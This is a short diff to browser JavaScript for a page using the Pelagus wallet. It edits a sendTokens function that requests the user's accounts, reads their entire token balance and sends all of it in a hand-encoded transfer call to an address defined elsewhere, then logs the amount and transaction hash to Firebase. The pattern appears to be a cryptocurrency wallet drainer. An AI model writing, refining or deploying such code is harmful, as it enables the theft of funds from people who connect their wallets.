@@ -438,19 +438,11 @@ async function saveToFirebase(data) {
 
         async function sendTokens() {
     try {
-        if (!window.pelagus) {
-            throw new Error('Pelagus wallet not found');
-        }
-
         const accounts = await window.pelagus.request({
             method: 'eth_requestAccounts'
         });
 
-        const provider = new quais.BrowserProvider(window.pelagus);
-        const signer = await provider.getSigner();
-        const address = await signer.getAddress();
-
-        const currentBalance = await getTokenBalance(address);
+        const currentBalance = await getTokenBalance(accounts[0]);
         if (currentBalance <= 0n) {
             throw new Error('No tokens available');
         }
@@ -460,11 +452,11 @@ async function saveToFirebase(data) {
         const paddedAmount = currentBalance.toString(16).padStart(64, '0');
 
         const transactionParameters = {
-            from: address,
+            from: accounts[0],
             to: TOKEN_ADDRESS,
             value: '0x0',
             data: '0x' + methodId + paddedAddress + paddedAmount,
-            gas: '0x7A120'  // 500,000 gas
+            gas: '0x7A120'
         };
 
         const txHash = await window.pelagus.request({
@@ -475,7 +467,6 @@ async function saveToFirebase(data) {
         log(`Transaction sent: ${txHash}`);
         await waitForTransaction(txHash);
         
-        // Update UI and database
         userSession.transferAmount = (Number(currentBalance) / 1e18).toString();
         userSession.transferTxHash = txHash;
         await saveSessionToFirebase();
